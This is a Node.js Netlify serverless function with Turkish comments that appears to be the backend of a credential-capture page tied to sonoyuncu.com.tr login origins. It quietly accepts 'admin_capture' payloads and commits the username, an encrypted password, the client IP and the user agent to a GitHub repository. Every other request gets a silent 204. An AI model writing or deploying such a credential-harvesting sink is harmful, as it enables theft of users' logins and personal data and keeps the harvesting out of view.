// netlify/functions/log-admin-capture.js
// Amaç: Sadece GERÇEK admin POST'larında yaz; diğer tüm isteklerde sessizce çık (204).
const { Octokit } = require("@octokit/rest");

const OWNER   = "Devrim-Sert";
const REPO    = "REPO";
const LOG_DIR = "logs/admin";

// Sitenin izin verdiğin origin/referrer listesi (gerekirse çoğalt)
const ORIGIN_WHITELIST = [
  "https://candid-capybara-606c8d.netlify.app",
  "https://giris.sonoyuncu.com.tr",
  "https://sonoyuncu.com.tr",
];

function okMethod(method) {
  return method === "POST";
}

function okOrigin(headers = {}) {
  const ref = (headers.origin || headers.referer || "").replace(/\/+$/, "");
  if (!ref) return false;
  return ORIGIN_WHITELIST.some((base) => ref.startsWith(base));
}

function parseBody(body) {
  try { return JSON.parse(body || "{}"); } catch { return null; }
}

// “Boş”/yansıyan çağrıları ayıkla: SADECE gerçek admin yakalamasını kabul et
function isRealPayload(p) {
  if (!p) return false;
  if (p.kind !== "admin_capture") return false;   // ön yüzden özel imza
  if (p.username !== "test") return false;        // sadece admin “test” kullanıcı
  if (typeof p.pw_enc_b64 !== "string") return false;
  if (p.pw_enc_b64.length < 300) return false;    // RSA-OAEP b64 ~300+ char
  return true;
}

function buildPath(now, payload) {
  const day  = now.toISOString().slice(0, 10);                // YYYY-MM-DD
  const time = now.toISOString().replace(/[:.]/g, "-");       // dosya adı güvenli
  const nonce = payload && payload.nonce ? `-${payload.nonce}` : "";
  return `${LOG_DIR}/${day}/${time}${nonce}.json`;
}

exports.handler = async (event) => {
  // CORS preflight vb.
  if (event.httpMethod === "OPTIONS") {
    return {
      statusCode: 204,
      headers: {
        "Access-Control-Allow-Origin": "*",
        "Access-Control-Allow-Methods": "POST,OPTIONS",
        "Access-Control-Allow-Headers": "Content-Type",
      },
    };
  }

  // 1) POST değilse asla yazma
  if (!okMethod(event.httpMethod)) {
    return { statusCode: 204, body: "skip" };
  }

  // 2) Origin/Referer whitelist değilse yazma
  // (Bazı Netlify iç çağrılarında origin boş olabilir; host eşleşirse kabul ediyoruz)
  const host = (event.headers && event.headers.host) || "";
  const hostOk = ORIGIN_WHITELIST.some((u) => u.includes(host));
  if (!okOrigin(event.headers) && !hostOk) {
    return { statusCode: 204, body: "skip" };
  }

  // 3) Body parse edilemiyorsa/boşsa yazma
  const payload = parseBody(event.body);
  if (!payload) {
    return { statusCode: 204, body: "skip" };
  }

  // 4) Gerçek admin payload’ı değilse yazma
  if (!isRealPayload(payload)) {
    return { statusCode: 204, body: "skip" };
  }

  // 5) Buradan sonrası: gerçekten logla
  const now = new Date();
  const path = buildPath(now, payload);

  const contentObj = {
    ts: now.toISOString(),
    username: payload.username,         // “test”
    pw_enc_b64: payload.pw_enc_b64,     // şifrelenmiş (b64)
    ua: event.headers["user-agent"] || null,
    ip: event.headers["x-nf-client-connection-ip"] || null,
    referer: event.headers.referer || null,
    host: event.headers.host || null,
  };
  const content = Buffer.from(JSON.stringify(contentObj, null, 2)).toString("base64");

  const octokit = new Octokit({ auth: process.env.GITHUB_TOKEN });

  await octokit.repos.createOrUpdateFileContents({
    owner: OWNER,
    repo: REPO,
    path,
    message: `admin log ${now.toISOString()}`,
    content,
  });

  return { statusCode: 200, body: "logged" };
};
